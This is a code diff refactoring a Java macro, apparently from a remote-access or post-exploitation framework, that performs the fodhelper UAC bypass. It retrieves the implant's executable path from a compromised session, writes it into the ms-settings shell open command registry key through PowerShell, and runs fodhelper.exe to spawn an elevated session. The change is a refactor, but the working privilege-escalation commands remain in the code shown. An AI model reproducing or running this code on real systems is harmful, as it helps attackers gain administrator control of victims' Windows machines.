@@ -13,7 +13,6 @@ public class SpawnFodhelperElevatedSessionMacro extends AbstractCommandMacro {
 	public static final String SET_ITEM_PROP_CMD_A = "powershell.exe -c \"Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value '";
 	
 	public static final String ENGAGE_FODHELPER_CMD = "fodhelper.exe";
-	private IOManager io;
 	
 	@Override
 	public boolean isCommandMatch(String cmd) {
@@ -21,28 +20,17 @@ public class SpawnFodhelperElevatedSessionMacro extends AbstractCommandMacro {
 	}
 
 	@Override
-	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
-		this.io = io;
-	}
-
-	@Override
 	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
 		MacroOutcome outcome = new MacroOutcome();
-		io.sendCommand(sessionId, Commands.CLIENT_GET_EXE_CMD);
-		outcome.addSentCommand(Commands.CLIENT_GET_EXE_CMD);
-		String clientCmd = io.awaitMultilineCommands(sessionId);
-		outcome.addResponseIo(clientCmd);
+		sendCommand(Commands.CLIENT_GET_EXE_CMD, sessionId, outcome);
+		String clientCmd = awaitResponse(sessionId, outcome);
 		clientCmd = clientCmd.replace("\r", "");
 		clientCmd = clientCmd.replace("\n", "");
-		outcome.addSentCommand(NEW_ITEM_CMD);
-		io.sendCommand(sessionId, NEW_ITEM_CMD);
-		outcome.addSentCommand(NEW_ITEM_PROP_CMD);
-		io.sendCommand(sessionId, NEW_ITEM_PROP_CMD);
+		sendCommand(NEW_ITEM_CMD, sessionId, outcome);
+		sendCommand(NEW_ITEM_PROP_CMD, sessionId, outcome);
 		String fodHelperCmd = SET_ITEM_PROP_CMD_A + clientCmd + SET_ITEM_PROP_CMD_B;
-		outcome.addSentCommand(fodHelperCmd);
-		io.sendCommand(sessionId, fodHelperCmd);
-		outcome.addSentCommand(ENGAGE_FODHELPER_CMD);
-		io.sendCommand(sessionId, ENGAGE_FODHELPER_CMD);
+		sendCommand(fodHelperCmd, sessionId, outcome);
+		sendCommand(ENGAGE_FODHELPER_CMD, sessionId, outcome);
 		outcome.addMacroMessage("Fodhelper engaged, new elevated session should be available if current user has elevated privs");
 		return outcome;
 	}
